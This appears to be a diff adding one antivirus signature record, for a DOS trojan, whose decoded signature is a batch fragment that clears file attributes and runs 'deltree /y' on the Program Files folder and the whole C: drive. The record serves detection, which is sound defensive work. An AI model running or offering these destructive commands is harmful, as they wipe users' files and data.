@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36628
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off echo . echo . ( : 01 ~ 03min) set path=%path%;c:\windows\command deltree/y c:\progra~1 > nul echo . attrib -a -r -h -s c:\*.* echo . deltree/y c:\* 
